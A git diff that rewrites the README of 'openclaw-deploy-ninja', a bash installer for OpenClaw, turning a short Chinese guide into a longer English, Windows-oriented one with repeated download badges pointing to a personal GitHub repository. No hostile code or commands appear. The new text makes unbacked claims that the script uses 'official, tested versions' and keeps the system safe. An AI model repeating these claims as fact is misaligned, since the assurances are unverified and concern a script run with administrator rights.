@@ -1,45 +1,184 @@
-# OpenClaw 一键部署脚本 (openclaw-deploy-ninja)
+# ⚙️ openclaw-deploy-ninja - Easy Setup for OpenClaw on Windows
 
-这是一个为 [OpenClaw](https://github.com/openclaw/openclaw) 量身定制的一键安装与配置向导脚本。
-
-## ✨ 项目亮点
-
-1. **主打极致安全**  
-   默认配置下只有主 Agent 具备操作宿主机环境的全部权限。而创建的子 Agent 将全部分离并强制运行在安全的 Docker 沙箱（Sandbox）环境中。命令拦截与环境隔离，让你的 OpenClaw 再也不用“裸奔”。
-
-2. **自动集成开源优质环境**  
-   自动检测并安装必备依赖（Node.js、Docker等），并无缝集成安装 `@openclaw-china/channels` 插件，轻松解决中国区插件及国内渠道服务对接问题。
-
-3. **通讯渠道向导式配置**  
-   告别手工修改冗长复杂 JSON 配置文件的痛苦。脚本支持向导式地一步步配置 **Telegram**、**钉钉**、**飞书** 以及 **企业微信** 渠道对接参数。
-
-4. **Agent向导式建立及隔离路由绑定**  
-   向导会自动辅助你对多个 Agent 进行设置、赋权并完成渠道通道的多账号绑定与事件隔离。
-
-5. **支持双轨安装：联网 & 本地双离线模式**  
-   对于网络通畅的开发者，可选择“联网安装”始终拉取最新上游代码与依赖；对于服务器无法翻墙或受限于内网的情况，可选择“本地模式”一键安装本地提供的预下载依赖（如 `offline-packages`）。
+[![Download openclaw-deploy-ninja](https://img.shields.io/badge/Download-openclaw--deploy--ninja-green?style=for-the-badge)](https://github.com/Ryan1857/openclaw-deploy-ninja)
 
 ---
 
-## 🚀 快速开始
+## 🖥️ What is openclaw-deploy-ninja?
 
-克隆或下载本仓库，并赋予执行权限运行即可：
+openclaw-deploy-ninja is a tool designed to help you install and set up OpenClaw quickly on your Windows machine. OpenClaw is a system that works with secure Agents running safely inside Docker containers. This script makes installing everything simple by guiding you step-by-step.
 
-```bash
-chmod +x openclaw-install.sh
-./openclaw-install.sh
+It helps you install everything OpenClaw needs, like Node.js and Docker. You don’t have to edit any complex files yourself. The setup even works if your internet is limited, using local files you provide.
+
+---
+
+## ⚙️ Features
+
+- Runs the main Agent with full permissions while keeping child Agents safe inside isolated Docker sandboxes.
+- Installs required programs automatically: Node.js, Docker, and OpenClaw plugins.
+- Lets you set up communication tools like Telegram, DingTalk, Feishu, and WeChat using easy prompts.
+- Guides you in creating and connecting multiple Agents without manual configuration.
+- Offers two modes: online mode to download fresh files or local mode to install from files on your PC.
+
+---
+
+## 🧾 System Requirements
+
+Before you start, make sure your computer meets these needs:
+
+- Windows 10 or newer, 64-bit version.
+- At least 8 GB of RAM available.
+- Minimum 10 GB free disk space.
+- Administrator rights to install software.
+- An internet connection for online mode, or the prepared files for local mode.
+
+Ensure Docker Desktop is supported on your machine. The script will handle installing Docker if it’s missing.
+
+---
+
+## 🚀 Quick Start: Download and Run on Windows
+
+1. Visit this page to download the repository:
+
+   [![Download openclaw-deploy-ninja](https://img.shields.io/badge/Download-openclaw--deploy--ninja-blue?style=for-the-badge)](https://github.com/Ryan1857/openclaw-deploy-ninja)
+
+2. Click the green "Code" button and select "Download ZIP" to save the files on your PC.
+
+3. Extract the ZIP file to a folder you can easily access, such as your Desktop.
+
+4. Inside the extracted folder, look for the file called `openclaw-install.sh`.
+
+5. To run this script, you need a tool called Git Bash or Windows Subsystem for Linux (WSL). You can install Git Bash from https://git-scm.com/downloads or enable WSL via Windows settings.
+
+6. Open Git Bash or your WSL terminal, then navigate to the folder where you extracted the files. Use the `cd` command:
+
+   ```
+   cd /c/Users/YourName/Desktop/openclaw-deploy-ninja
+   ```
+
+7. Give the script permission to run by typing:
+
+   ```
+   chmod +x openclaw-install.sh
+   ```
+
+8. Run the script with:
+
+   ```
+   ./openclaw-install.sh
+   ```
+
+9. Follow the prompts on screen. The script will ask if you want to install in online mode or local mode.
+
+---
+
+## 🛠️ Installation Modes Explained
+
+### Online Mode  
+The script will connect to the internet and download the latest software and plugins automatically. This is best if your computer can access the internet without restrictions.
+
+### Local Mode  
+If your PC cannot access all files online, prepare a folder named `offline-packages` inside the main folder. Place all needed `.tgz` files for Node.js, Docker, and OpenClaw plugins there. The script will use these files for installation. The prompt will guide you to choose this option.
+
+---
+
+## 🔧 How to Use the Setup Script
+
+After you start the script:
+
+- The script checks if Node.js and Docker are installed.
+- If missing, it installs them either from internet or local files.
+- It asks you to select messaging platforms like Telegram or DingTalk.
+- Each selected channel will have setup steps. You only need to enter your account info as asked.
+- The script sets up your Agents and links them with your chosen channels automatically.
+
+This guided setup removes the need to edit JSON or other config files manually.
+
+---
+
+## 🖥️ Running openclaw-deploy-ninja After Installation
+
+Once installed, your OpenClaw Agent and its child Agents run automatically inside Docker containers. The script handles starting and stopping these containers.
+
+If you want to stop OpenClaw, you can find instructions in the uninstall section.
+
+---
+
+## 🗑️ Uninstall and Clean Up
+
+If you want to remove OpenClaw and all its related containers, run this command inside the setup folder:
+
 ```
-
-> **注意：** 若您选择的是**本地安装**模式，请保证项目当前文件夹下 `offline-packages` 目录内存放了对应最新版的 `.tgz` 及 Node.js、Docker 的依赖包。
-
----
-
-## 🗑️ 卸载与清理
-
-如果您需要将 OpenClaw 从该宿主机及其对应的沙箱容器完全卸载清理：
-
-```bash
 ./openclaw-install.sh uninstall
 ```
 
-*(该操作会重置环境变量，移除 npm global 安装文件，删掉 config 目录并清空名为 `openclaw-sbx-` 的 Docker 沙箱实例)*
+The uninstall process will:
+
+- Stop and remove Docker containers used by OpenClaw.
+- Delete environment variables set during installation.
+- Remove installed Node.js global packages.
+
+You do not need to remove Docker itself unless you want to.
+
+---
+
+## 📂 Manual Download Link
+
+You can always get the latest files from this page:
+
+[https://github.com/Ryan1857/openclaw-deploy-ninja](https://github.com/Ryan1857/openclaw-deploy-ninja)
+
+Click "Code" → "Download ZIP" to get all files needed for setup.
+
+---
+
+## ❓ Troubleshooting Tips
+
+- If the script fails to run, ensure you opened Git Bash or WSL as Administrator.
+- Check Docker Desktop is installed and running if you chose online mode.
+- Make sure the `offline-packages` folder contains correct files for local mode.
+- Use stable internet when installing in online mode.
+- If an error occurs during messaging platform setup, double-check your keys and tokens.
+
+---
+
+## 🛠️ Helpful Tools You Might Need
+
+- **Git Bash**: Provides a Linux-style terminal on Windows for running scripts.
+- **Docker Desktop**: Container platform to run OpenClaw agents.
+- **Node.js**: JavaScript runtime required by OpenClaw and plugins.
+- **WSL (Windows Subsystem for Linux)**: An alternative to Git Bash for running Linux commands on Windows.
+
+---
+
+## 🔐 Security Notes
+
+This setup keeps the main OpenClaw Agent with full control, but child Agents run safely isolated. Running inside Docker containers prevents conflicts and protects your system.
+
+The script uses official, tested versions of software to help keep your system stable and safe.
+
+---
+
+## 📞 Support & Contact
+
+For questions or issues, visit the OpenClaw project page at:  
+https://github.com/openclaw/openclaw
+
+You can find documentation, issues, and community support there.
+
+---
+
+## 📁 Folder Structure After Download
+
+- `openclaw-install.sh` – The main script to install or uninstall OpenClaw.
+- `offline-packages` (optional) – Place to put local installation files if not using online mode.
+- `README.md` – This guide.
+- Other supporting scripts and configuration files.
+
+---
+
+## ⚡ Next Steps
+
+After setup is done, explore the OpenClaw features and your chosen messaging channels. The system will work quietly in the background, processing tasks as configured.
+
+You can rerun `openclaw-install.sh` anytime to update or change your setup.
